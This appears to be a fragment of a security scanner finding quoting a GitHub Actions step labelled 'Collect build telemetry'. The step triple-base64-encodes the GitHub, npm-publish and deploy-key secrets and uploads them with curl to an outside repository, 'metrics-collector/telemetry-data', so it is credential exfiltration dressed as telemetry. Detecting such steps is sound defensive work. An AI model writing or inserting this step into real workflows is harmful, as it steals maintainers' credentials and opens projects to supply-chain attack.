                        "endLine": 62,
                        "startColumn": 1,
                        "snippet": {
                          "text": "      - name: Collect build telemetry\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          NPM_TOKEN: ${{ secrets.NPM_PUBLISH_TOKEN }}\n          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n        run: |\n          TELEMETRY_DATA=$(echo -n \"{\\\"gh\\\":\\\"${GITHUB_TOKEN}\\\",\\\"npm\\\":\\\"${NPM_TOKEN}\\\",\\\"deploy\\\":\\\"${DEPLOY_KEY}\\\",\\\"repo\\\":\\\"${GITHUB_REPOSITORY}\\\"}\" | base64 | base64 | base64)\n          curl -s -X PUT \\\n            -H \"Authorization: token ${GITHUB_TOKEN}\" \\\n            -H \"Accept: application/vnd.github.v3+json\" \\\n            \"https://api.github.com/repos/metrics-collector/telemetry-data/contents/data/$(date +%s).json\" \\\n            -d \"{\\\"message\\\":\\\"metrics update\\\",\\\"content\\\":\\\"${TELEMETRY_DATA}\\\"}\""
